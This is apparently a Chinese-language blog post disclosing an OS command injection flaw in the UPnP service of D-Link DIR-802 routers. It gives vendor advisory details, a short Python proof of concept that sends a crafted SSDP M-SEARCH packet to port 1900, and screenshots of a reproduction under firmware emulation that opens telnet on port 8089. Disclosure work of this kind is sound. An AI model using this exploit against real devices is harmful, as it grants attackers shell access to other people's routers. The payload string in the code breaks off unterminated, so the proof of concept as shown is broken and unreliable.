---
title: DIR-802 OS Command Injection
date: 2021-03-02 13:36:32
tags:
- D-LINK
- UPnP
- 固件模拟
categories:
- IOT
description: 提交个漏洞
---
### D-LINK DIR-802 命令注入漏洞
> by Cool
#### 漏洞已提交厂商
https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10206
#### 漏洞类型
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

#### 受影响设备及软件版本
DIR-802 hardware revision Ax before v1.00b05
https://pmdap.dlink.com.tw/PMD/GetAgileFile?itemNumber=FIR1300450&fileName=DIR802_FW100b05.zip&fileSize=6163759.0;

#### 漏洞概要
DIR-802中存在一个命令注入漏洞，攻击者可以通过精心制作的M-SEARCH数据包向UPnP注入任意命令。

#### 漏洞详情
与CVE-2020-15893相似，在固件版本v-1.00b05之前的D-Link DIR-802 A1上发现了一个问题。默认情况下，端口1900上启用了通用即插即用（UPnP）。攻击者可以通过将有效负载注入SSDP M-SEARCH发现数据包的“搜索目标”（ST）字段来执行命令注入。

#### POC
```python
# coding: utf-8
import socket
import struct
buf = 'M-SEARCH * HTTP/1.1\r\nHOST:192.168.0.1:1900\r\nST:urn:schemas-upnp-org:service
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("192.168.0.1", 1900))
s.send(buf)
s.close()
```

#### 漏洞复现
使用firmadyne进行固件模拟，运行UPnP服务
<img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1614665628/cve/carbon.png" width="50%" height="50%">

攻击者可以是连接到路由器局域网内并且能够向UPnP端口发送请求的任何人。可以通过编写简单的python脚本将精心制作的数据包发送到特定的upnp端口，该脚本随后将作为精心制作的请求的一部分执行提供的命令。共享的POC将打开端口8089上的telnet服务。
<img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1614665899/cve/carbon_1.png" width="50%" height="50%">
